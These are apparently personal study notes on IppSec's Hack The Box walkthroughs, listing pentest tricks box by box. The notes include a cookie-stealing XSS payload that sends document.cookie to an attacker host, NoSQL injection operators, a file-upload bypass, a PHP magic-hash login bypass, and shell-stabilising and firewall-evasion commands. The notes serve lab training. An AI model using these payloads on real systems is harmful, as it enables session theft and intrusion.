Notes from IppSec's walkthroughs of the HTB machines I don't have access to :(
It's hard to practice scripting by just watching, so I went through this quickly and took some general CTF notes on each box

Vault
  - For a fully stable shell --> python -c 'import pty;pty.spawn("/bin/bash")' --> CTRL + Z --> ssty raw -echo --> fg [enter] [enter]--> export TERM=xterm
  - You can remote port forward in order to recieve a shell on your machine that is only available internally (send reverse shell to ssh user, which forwards the connection to your attacker machine)
  - ssh -R 127.0.0.1:9001:127.0.0.1:9001
  - You can bypass firewalls with the flag --source-port x in nmap. For example, if the firewall is blocking everything except DNS (port 53), try nmap ...... --source-port 53

Popcorn
  - You can test for virtual hosts by intercepting requests and changing the Host header

Celestial
  - NodeJS deserialization in the cookie was pretty cool to see, but nothing extraordinary

Blocky
  - Remember to decompile .class and .jar files with JadX!

Falafel
  - Use --string "xxx" in sqlmap to use a string present in the response as a flag of successful injections
  - Remember the PHP magic hash trick --> With PHP loose comparison, a hash starting with 0e will always evaluate to 0
  - This means that any plaintext will work as a password as long as its hash starts with 0e (because the comparison will end up being 0 == 0)
  - The filename had a char limit, which would truncate everything beyond it. Uploading aaaaaaaa.php.gif and forcing the truncation after .gif bypassed the file upload restrictions
  - Super cool privesc --> https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#video-group
  - Super cool privesc #2 --> https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group
  - Manually exploiting the SQLi with a python script is very similar to what's shown in the OSWE material!

Zipper
  - Add the prefix "nohup" to a command to make sure the process isn't tied to the original one
  - This means that if you're shell is dying due to a timeout or something similar, nohup will solve that

Unattended
  - Don't forget to check certificate details when faced with HTTPs servers, it can be good for recon
  - URLs aren't always the same as file paths. You can have alias. For example, location /dev { alias /var/www/dev; } and location / { alias /var/www/html; }
  - Use --no-string "xxx" in sqlmap to use a string present in the response as a flag of failed injections
  - This PHPSESSID injection along with LFI was pretty cool --> https://book.hacktricks.xyz/pentesting-web/file-inclusion#via-php-sessions

Help
  - The initial exploit was tricky to fire since the time on the box was slightly off (also, timezones!)
  - To fix this, get the date from the response. Run it in a loop in order to provide a ~1 minute buffer
  - Another great box to practice crafting manual SQLi scripts in Python 

Mango
  - If you have a parameter such as username=admin&password=passwordAttempt, a cool NoSQL injection trick is to change it to username[$ne]=admin&password[$ne]passwordAttempt
  - Alternatively, the following also works! This examples checks if there's a username with 5 characters username[$regex]=^.{5}
  - Another great Python script demonstration for NoSQL injecton exploitation

Schooled
  - Awesome XSS exploitation! <script src="http://my_ip/malicious.js"></script> and fill malicious.js with a cookie stealing script
  - document.write('<img src="http://my_ip/?' + document.cookie + '">');
  - Mass assignment vulnerability --> When you can add/edit parameters which are not shown in the UI by tampering the request

Sink
  - Cool HTTP request smuggling, but this doesn't seem applicable to OSWE
